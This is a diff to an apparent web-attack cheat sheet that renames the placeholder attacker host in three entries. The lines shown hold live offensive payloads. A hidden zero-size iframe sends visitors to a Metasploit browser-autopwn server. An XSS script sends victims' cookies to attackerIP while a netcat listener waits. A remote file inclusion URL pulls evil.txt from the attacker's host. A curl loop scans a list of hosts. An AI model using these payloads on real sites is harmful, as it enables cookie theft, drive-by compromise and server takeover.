@@ -46,7 +46,7 @@ for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i
 
 # Browser Redirection
 
-<iframe SRC="http://hackerip/report" height = "0" width ="0">
+<iframe SRC="http://attackerIP/report" height = "0" width ="0">
 hacker:  use Metasploit browser autopwn listening on hackerip
 ------------------------------------------------------------------------------------------------------
 
@@ -67,7 +67,7 @@ for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i
 
 # Cookie Stealing
 
-<script>new Image().src="http://hackerIP/test.php?"+ document.cookie;</script>
+<script>new Image().src="http://attackerIP/test.php?"+ document.cookie;</script>
 hacker:  nc -lvp 80
 ------------------------------------------------------------------------------------------------------
 
@@ -117,7 +117,7 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://localhost/index.php?page=http://attackersIP/evil.txt
+http://localhost/index.php?page=http://attackerIP/evil.txt
 ------------------------------------------------------------------------------------------------------
 
 # TRACE / TRACK methods allowed
